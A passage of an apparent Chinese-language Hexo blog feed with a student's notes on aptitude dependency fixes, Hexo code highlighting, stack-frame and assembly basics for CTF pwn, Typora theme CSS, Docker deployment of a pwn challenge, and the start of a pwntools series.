<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png" data-caption="截屏2021-10-27 下午11.00.00" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png" alt="截屏2021-10-27 下午11.00.00"></a></p>
<p>​    这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。</p>
<p>​    明确地告诉了我：</p>
<pre><code class="bash">The following actions will resolve these dependencies:

      Keep the following packages at their current version:
      ...
      ...
      ...
      Accept this solution? [Y/n/q/?] 

</code></pre>
<p>保持下面软件包的版本不变，你接受这个解决方式吗？</p>
<p>显然我不接受，只要摁下N，问题就解决了。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png" data-caption="" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png" alt=""></a></p>
<p>然后。自动执行gdb-multilib的安装。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png" data-caption="image-20211027230403989" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png" alt="image-20211027230403989"></a></p>
<p>问题解决。</p>
<h3 id="3）总结">3）总结<a class="post-anchor" href="#3）总结"></a></h3><p>​    这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。</p>
<p>​    一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧）</p>
<h3 id="4）参考">4）参考<a class="post-anchor" href="#4）参考"></a></h3><p><a href="https://blog.csdn.net/White_Idiot/article/details/58348957">【Ubuntu】aptitude命令详解</a></p>
<p><a href="https://askubuntu.com/questions/223237/unable-to-correct-problems-you-have-held-broken-packages">Unable to correct problems, you have held broken packages</a></p>
</body></html>]]></content>
      <tags>
        <tag>linux primary</tag>
      </tags>
  </entry>
  <entry>
    <title>解决hexo无法显示高亮问题</title>
    <url>/2021/10/28/%E8%A7%A3%E5%86%B3hexo%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%AB%98%E4%BA%AE%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<html><head></head><body><p>​    博客搭了有快一年了，一直是hexo+git page的配置（不过这个搭配现在绝版了2333），但是一直荒废着，差不多到大一暑假的时候才想起要好好经营。</p>
<p>​    但是代码高亮这个一直没有解决。</p>
<p>​    之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。</p>
<p>​    在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。</p>
<p>​    一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。</p>
<p>​    然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。</p>
<p>​    <a href="https://igeek.cloud/2021/01/13/hexo%E4%B8%ADhighlight-js%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%9A%84%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95/">hexo中highlight.js代码高亮的修改方法</a></p>
<p>​    按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把</p>
<pre><code class="html">COPY&lt;!-- Highlight.js --&gt;
&lt;link rel="stylesheet"
        href="//highlightjs.org/static/demo/styles/night-owl.css"&gt;
&lt;script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"&gt;
&lt;/script&gt;
&lt;script&gt;
    hljs.initHighlightingOnLoad();
&lt;/script
</code></pre>
<p>丢了进去。</p>
<p>​    然后我的博客就成功的显示了代码高亮。</p>
<p>​    这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。</p>
<p>​    </p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的函数调用栈基础</title>
    <url>/2021/10/12/%E6%91%86%E7%83%82%E7%AC%AC%E4%B8%80%E5%A4%A9--%E5%86%8D%E6%8E%A2%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
    <content><![CDATA[<html><head></head><body><h3 id="1）前言">1）前言<a class="post-anchor" href="#1）前言"></a></h3><p>stack_pro力求从最底层的角度深究每一道简单的栈溢出题背后的原理。而第一章则从栈溢出的理论基础–函数调用栈开始。</p>
<h3 id="2）函数调用栈">2）函数调用栈<a class="post-anchor" href="#2）函数调用栈"></a></h3><p>从一个简单的程序入手。</p>
<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" data-caption="image-20211012194601557" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png" alt="image-20211012194601557"></a></p>
<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>
<pre><code class="asm">push    rbp
mov     rbp, rsp
sub     rsp, 30h
</code></pre>
<p>然后就是人神共愤的函数调用栈环节。</p>
<blockquote>
<p>rbp ： 栈基址指针寄存器 。</p>
<p>rsp ： 栈顶指针寄存器。</p>
</blockquote>
<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>
<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>
<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" data-caption="截屏2021-10-12 下午11.11.18" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png" alt="截屏2021-10-12 下午11.11.18"></a></p>
<p>​     ebp也就是s的位置，很显然在esp之下。</p>
<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>
<blockquote>
<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>
</blockquote>
<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" data-caption="截屏2021-10-13 下午8.01.32" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png" alt="截屏2021-10-13 下午8.01.32"></a></p>
<blockquote>
<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>
</blockquote>
<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>
<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>
<p>​    关于压栈的一些传参方式，可以参见<a href="https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" data-caption="截屏2021-10-13 下午5.14.08" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png" alt="截屏2021-10-13 下午5.14.08"></a></p>
<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>
<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>
<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>
<p>tbc</p>
</body></html>]]></content>
      <tags>
        <tag>asm Primary</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的汇编语言复习</title>
    <url>/2021/10/13/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%8C%E5%A4%A9--%E5%86%8D%E6%8E%A2%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h3 id="1）寻址">1）寻址<a class="post-anchor" href="#1）寻址"></a></h3><h5 id="1-直接寻址">1/直接寻址<a class="post-anchor" href="#1-直接寻址"></a></h5><pre><code class="asm">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。
</code></pre>
<h5 id="2-间接寻址">2/间接寻址<a class="post-anchor" href="#2-间接寻址"></a></h5><p>间接在使用指针以及解引用的形式</p>
<pre><code class="asm">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。
</code></pre>
<h5 id="3-比例寻址">3/比例寻址<a class="post-anchor" href="#3-比例寻址"></a></h5><p>例如在数组遍历中</p>
<pre><code class="asm">.data
arrayD 1,2,3,4
.code
mov esi,3
mov eax,arrayD[esi*4]                    ;eax = 4
</code></pre>
<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>
<h2 id="2）段寄存器">2）段寄存器<a class="post-anchor" href="#2）段寄存器"></a></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>
<h2 id="3）基础指令">3）基础指令<a class="post-anchor" href="#3）基础指令"></a></h2><h3 id="1-数据传输">1/数据传输<a class="post-anchor" href="#1-数据传输"></a></h3><h4 id="mov">mov<a class="post-anchor" href="#mov"></a></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>
<h5 id="movzx">movzx<a class="post-anchor" href="#movzx"></a></h5><p>对目的操作数进行全0拓展并且复制。</p>
<h5 id="movsx">movsx<a class="post-anchor" href="#movsx"></a></h5><p>同上，但是是用1拓展而不是0。</p>
<p>与数据传输相关的指令还有很多，以后待补充。</p>
<h3 id="2-与数据相关的运算符和伪指令">2/与数据相关的运算符和伪指令<a class="post-anchor" href="#2-与数据相关的运算符和伪指令"></a></h3><h4 id="offset">offset<a class="post-anchor" href="#offset"></a></h4><p>返回一个偏移量</p>
<h4 id="align">align<a class="post-anchor" href="#align"></a></h4><p>将一个变量对齐到边界。</p>
<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>
<h4 id="ptr">ptr<a class="post-anchor" href="#ptr"></a></h4><p>重写一个已经被声明过操作数的大小类型。</p>
<h4 id="type">type<a class="post-anchor" href="#type"></a></h4><p>返回变量单个元素的大小</p>
<h4 id="lengthof">lengthof<a class="post-anchor" href="#lengthof"></a></h4><p>计算数组中元素的个数</p>
<h4 id="sizeof">sizeof<a class="post-anchor" href="#sizeof"></a></h4><p>返回lengthof和type的乘积</p>
<h3 id="-1"><a class="post-anchor" href="#-1"></a></h3></body></html>]]></content>
      <tags>
        <tag>asm Primary</tag>
      </tags>
  </entry>
  <entry>
    <title>typora主题配置的一些心得</title>
    <url>/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<html><head></head><body><p>![触控栏快照2021-10-29 下午11.50.07](/Users/rin/Desktop/触控栏快照2021-10-29 下午11.50.07.png)</p>
<h4 id="1）">1）<a class="post-anchor" href="#1）"></a></h4><p>​    由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。</p>
<h4 id="2）">2）<a class="post-anchor" href="#2）"></a></h4><p>​    在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。</p>
<p>​    这里以主题<code>mint</code>为例，css中<code>:root</code>元素声明了全局css变量，如下：</p>
<pre><code class="css"> :root {
  --side-bar-bg-color: #ffffff;//边栏颜色
    --control-text-color: #6B6B6B;//边栏文件未选中字体颜色
    --active-file-bg-color: #ecf6f2;//边栏文件背景颜色
    --active-file-border-color: #6B6B6B;//不清楚是个啥
    --active-file-text-color: #202020;//边栏文件选中后字体颜色
    --table-even-row-color:#f8fcfa;//不清楚是个啥
    --table-head-color:#d9ede5;//不清楚是个啥
    --deep-theme-color: #c2e2d5;//深色模式主题色
    --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色
    
}
</code></pre>
<p>​    所以如果想修改各种配色，只需要修改对应颜色的hex就行。</p>
<p>​    这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（</p>
<p>​    然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用<code>highlight.js</code>（感觉也差不多233）。</p>
<p>​    然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（</p>
<p>​    (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢)</p>
<p>​    其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png" data-caption="截屏2021-10-30 下午2.46.50" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png" alt="截屏2021-10-30 下午2.46.50"></a></p>
<p>​        顺便附上它的css</p>
<pre><code class="css"> :root {
    --side-bar-bg-color: #ffffff;
    --control-text-color: #424242;
    --active-file-bg-color: #ffffff;
    --active-file-border-color: #6B6B6B;
    --active-file-text-color: #7eadad;
    --table-even-row-color:#555555;
    --table-head-color:#7a7979;
    --deep-theme-color: #343a41;
    --code-block-bg-color: #292424;
    
}

/*serif*/
@font-face {
    font-family: 'Lexend';
    font-weight: normal;
    font-style: normal;
    src: url('./mint/Lexend-Regular.ttf') 
}

@font-face {
    font-family: 'Lexend';
    font-weight: bold;
    font-style: normal;
    src: url('./mint/Lexend-Bold.ttf') 
}

/*monospace*/
@font-face {
    font-family: 'SourceCodePro';
    font-weight: normal;
    font-style: normal;
    src: local(SourceCodePro), url('./mint/SourceCodePro-Regular.ttf')
}

/*Chinese*/
@font-face {
    font-family: 'NotoSansSC';
    font-weight: normal;
    font-style: normal;
    src: url('./mint/NotoSansSC-Regular.otf')
}

@font-face {
    font-family: 'NotoSansSC';
    font-weight: bold;
    font-style: normal;
    src: url('./mint/NotoSansSC-Bold.otf')
}

html{
    font-size: 16px;
}

body {
    font-family: 'Lexend','SourceCodePro','NotoSansSC';
    font-weight: normal;
    line-height: 1.5rem;
    letter-spacing: 0;
    margin: 0;
}

#write {
    max-width: 900px;
    padding: 30px 50px 20px;
}

#write p{
    text-align:left;
}

#write pre.md-meta-block {
    padding: 1rem;
    font-size: 85%;
    line-height: 1.45;
    background-color: #ffffff;
    border: 0;
    border-radius: 3px;
    color: #141414;
    margin-top: 0 !important;
}

.md-image&gt;.md-meta {
    color: #141414;
    font-size: 0.9rem;
    font-family: 'Lexend';
    padding: 4px 0;
}


@media print {
  html,body {
    font-size: 14px;
  }

  table,
  pre {
    page-break-inside: avoid;
  }

  pre {
    word-wrap: break-word;
  }
  
}
@page {
  size: A4; 
  margin: 8mm 0mm;
}

/*toc*/
.md-toc { 
    margin-top:20px;
    padding-bottom:20px;
    color: var(--deep-theme-color);
}

a {
    color: var(--deep-theme-color);
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}

/*headers*/
h1,h2,h3,h4,h5,h6 {
    display: block;
    font-weight:bold;
}

h1 {
    font-size: 2em;
    margin-top: 0.67em;
    margin-bottom: 0.67em;
}

h2 {
    font-size: 1.5em;
    margin-top: 0.83em;
    margin-bottom: 0.83em;
}

h3 {
    font-size: 1.17em;
    margin-top: 1em;
    margin-bottom: 1em;
}

h4 {
    font-size: 1em;
    margin-top: 1.33em;
    margin-bottom: 1.33em;
}

h5 {
    font-size: 1em;
    margin-top: 1.33em;
    margin-bottom: 1.33em;
    color: #777777;
}

h6 {
    font-size: 1em;
    margin-top: 1.33em;
    margin-bottom: 1.33em;
    color: #adadad;
}

p,
blockquote,
ul,
ol,
dl,
table {
    margin: 0.8rem 0;
}

/*table*/
table {
    border-collapse: collapse;
    padding: 0;
    word-break: initial;
    table-layout: fixed;
    width: 100%;
}

table tr:nth-child(even){
    background-color: var(--table-even-row-color);
}

thead{
    background-color: var(--table-head-color);
}

table th{
    text-align: center;
    padding:6px 13px;
    border: 1px solid var(--table-head-color);
}

table td{
    padding:6px 13px;
    border: 1px solid var(--table-head-color);
}
table tr{
    padding:6px 13px;
    border: 1px solid var(--table-head-color);
}

/*blockquote*/
blockquote {
    border-left: 0.2rem solid var(--side-bar-bg-color);
    color: #b4d8e9;
    font-family: 'Lexend','NotoSansSC';
    font-size: 0.9rem;
    padding-left: 2rem;
}


/*list*/

li p.first {
    display: inline-block;
}
ul,
ol {
    padding-left: 30px;
}
ul:first-child,
ol:first-child {
    margin-top: 0;
}
ul:last-child,
ol:last-child {
    margin-bottom: 0;
}

.md-task-list-item:hover &gt; input:before,
input[type='checkbox']:hover:before {
    opacity: 1;
    transition: 0.5s;
    background-color: var(--side-bar-bg-color);
}

.task-list-item input::before {
    content: "";
    display: inline-block;
    border-radius: 1.1rem;
    vertical-align: middle;
    border: 1.2px solid var(--deep-theme-color);
    background-color: #ffffff;
    width: 1.1rem;
    height: 1.1rem;
    margin-left: -0.1rem;
    margin-right: 0.1rem;
    margin-top: -0.68rem; 
}


.task-list-item input:checked::before {
    padding-left: 0.125em;
    content: '✔';
    color:white;
    background-color: var(--deep-theme-color);
    font-size: 0.8rem;
    line-height: 0.95rem;
    margin-top: -0.68rem;
    transition: background-color 200ms ease-in-out;
}



.task-list-done {
    text-decoration: line-through;
    color: #343a41;
}

hr {
    border-style: none;
    border-top-style: solid;
    border-color: #e7e7e7;
    border-width: 1px;
    margin: 2rem 0;
}


/*highlight*/
#write mark {
    background-color: #c7ffe8;
    border-radius: 2px;
    color: rgb(44, 39, 39);
    padding: 0 4px;
    margin: 0 2px;
}

/*inline code*/
#write code,tt {
    padding: 0.6px 4px;
    border-radius: 2px;
    background-color: rgba(238, 238, 238, 0.39);
    font-family: 'SourceCodePro',Consolas,Courier, Monospace;
    font-size: 0.9rem;
    color: #666666;
    margin: 0 2px;
}

/*footnote*/
#write .md-footnote {
    color: #343a41;
    background-color: #e4e4e4;
}

/*source code mode*/
.cm-s-typora-default .cm-header {
    color: #524a4a;
}
.cm-s-typora-default .cm-link {
    color:var(--deep-theme-color);

}


/*code block*/
#write .md-fences {
    font-size: 1rem;
    margin: 0.2em 0;
    padding: 0.5em;
    border-radius: 3px;
    font-size: 0.9em;
    font-family: 'SourceCodePro',Consolas,Courier, Monospace ;
    background-color: #fffdfd;
    color: #a3a3a3;
    border: none;
    text-shadow: none;
}

.md-fences .code-tooltip {
    background-color: #ffffff;
}

/*
  Name:       material-ocean
  Author:     Mattia Astorino (http://github.com/equinusocio)
  Website:    https://material-theme.site/
*/

.cm-s-inner.CodeMirror {
  background-color: #ffffff;
  color: #343a41;
}

/*.cm-s-inner .CodeMirror-gutters {
  background: #ffffff;
  color: #ffffff;
  border: none;
}
*/
.cm-s-inner .CodeMirror-linenumber {color: #343a41;}
.cm-s-inner .CodeMirror-guttermarker { color: #FFEE80; }
.cm-s-inner .CodeMirror-guttermarker-subtle { color: #D0D0D0; }

/*
.cm-s-inner .CodeMirror-cursor {
  border-left: 1px solid #FFCC00;
}
.cm-s-inner.cm-fat-cursor .CodeMirror-cursor {
  background-color: #FFCC00 !important;
}
.cm-s-inner .cm-animate-fat-cursor {
  background-color: #FFCC00 !important;
}
*/

.cm-s-inner .CodeMirror-cursor { border-left: 1px solid #A9B7C6; }
.cm-s-inner div.CodeMirror-cursor { border-left: 1px solid #ffffff; }
.cm-s-inner div.CodeMirror-selected {
  background: rgba(58, 58, 59, 0.2);
}

.cm-s-inner.CodeMirror-focused div.CodeMirror-selected {
  background: rgba(221, 224, 241, 0.2);
}

.cm-s-inner .CodeMirror-selected{ background: #d6dce7 !important; }
.cm-s-inner .CodeMirror-selectedtext { background: #dbdee6 !important; }
.cm-overlay.CodeMirror-selectedtext { background: #B5D6FC !important; }

.cm-s-inner .CodeMirror-line::selection,
.cm-s-inner .CodeMirror-line&gt;span::selection,
.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection {
  background: rgba(221, 224, 241, 0.2);
}

.cm-s-inner .CodeMirror-line::-moz-selection,
.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,
.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection {
  background: rgba(221, 224, 241, 0.2);
}

.cm-s-inner .CodeMirror-activeline-background {
  background: #ffffff;
}

.cm-s-inner .cm-keyword {
  color: #8979c0;
}

.cm-s-inner .cm-operator {
  color: #25c494;
}

.cm-s-inner .cm-variable-2 {
  color: #4f5481;
}

.cm-s-inner .cm-variable-3,
.cm-s-inner .cm-type {
  color: #f84f57;
}

.cm-s-inner .cm-builtin {
  color: #eca622;
}

.cm-s-inner .cm-atom {
  color: #F78C6C;
}

.cm-s-inner .cm-number {
  color: #ad7a83;
}

.cm-s-inner .cm-def {
  color: #82AAFF;
}

.cm-s-inner .cm-string {
  color: #70be26;
}

.cm-s-inner .cm-string-2 {
  color: #7a232e;
}

.cm-s-inner .cm-comment {
  color: #3a4677;
}

.cm-s-inner .cm-variable {
  color: #bb584b;
}

.cm-s-inner .cm-tag {
  color: #b44457;
}

.cm-s-inner .cm-meta {
  color: #b9b717;
}

.cm-s-inner .cm-attribute {
  color: #71498a;
}

.cm-s-inner .cm-property {
  color: #a075be;
}

.cm-s-inner .cm-qualifier {
  color: #f8ce11;
}

.cm-s-inner .cm-variable-3,
.cm-s-inner .cm-type {
  color: #fce470;
}


.cm-s-inner .cm-error {
  color: rgba(255, 255, 255, 1.0);
  background-color: #FF5370;
}

.cm-s-inner .CodeMirror-matchingbracket {
  text-decoration: underline;
  color: white !important;
}


</code></pre>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>docker学习笔记</title>
    <url>/2021/11/01/docker%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<html><head></head><body><p>​    还是最近需要部署pwn题至平台，所以需要学习一定的docker容器知识。我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。</p>
<h3 id="1-docker基础架构">1  docker基础架构<a class="post-anchor" href="#1-docker基础架构"></a></h3><p>​    对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致架构与关系。</p>
<p>​    首先需要知道镜像，容器与仓库的关系。就像面向对象程序设计中，类与实例的关系相似，镜像是一个静态的概念，包含了一套完整的root文件系统，当镜像运行时，它被称为容器。</p>
<p>​    </p>
<p>​    </p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>基于ctf pwn环境的docker搭建</title>
    <url>/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<html><head></head><body><h2 id="1）">1）<a class="post-anchor" href="#1）"></a></h2><p>​    最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架。</p>
<h2 id="2）">2）<a class="post-anchor" href="#2）"></a></h2><p>​    首先是框架的选择，pwn的框架其实很多，这里随便选一个最基础的<code>ctf_xinted</code>。</p>
<p>​    首先我们需要做的是把项目clone到本地。</p>
<p><a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png" data-caption="截屏2021-11-01 下午5.11.41" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png" alt="截屏2021-11-01 下午5.11.41"></a></p>
<p>​    通过指令<code>cat Dockerfile</code>可以看到dockerfile。</p>
<p>​    dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。</p>
<pre><code> 这里我们直接切换到`ctf_xinetd`的文件夹下，然后执行     
</code></pre>
<pre><code class="bash">sudo docker build -t "helloworld" .
</code></pre>
<p>​    (注意后面的“.”)</p>
<p>​    这个时候一般就会创建<code>helloworld</code>这个镜像，我们只需要等待创建结束，然后执行</p>
<pre><code class="bash">sudo docker run -d -p "0.0.0.0:10001:9999" -h "helloworld" --name="helloworld" helloworld
</code></pre>
<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。</p>
<p>​    如果运行正常，此时我们是能够通过 <code>nc 0.0.0.0 10001</code>来连接我们的docker容器的。</p>
<p>​    但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样</p>
<pre><code class="bash">sudo service docker restart
</code></pre>
<p>​    这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。</p>
<p>​    但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。</p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>pwntools(1)-- pwnlib.tube</title>
    <url>/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/</url>
    <content><![CDATA[<html><head></head><body><h3 id="0-preview">0)preview<a class="post-anchor" href="#0-preview"></a></h3><p>​    一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入：</p>
<pre><code class="python">from pwn import*
</code></pre>
<p>​    我也如此。</p>
<p>​    在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。</p>
<p>​    这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。</p>
<p>​    第一部分，则是一个至关重要的part–<code>pwnlib.tube</code></p>
<h3 id="1-进程间通信">1)进程间通信<a class="post-anchor" href="#1-进程间通信"></a></h3><p>​    在了解<code>pwnlib.tube</code>之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》</p>
<p>​    tbc…</p>
<p>​    </p>
</body></html>]]></content>
      <tags>
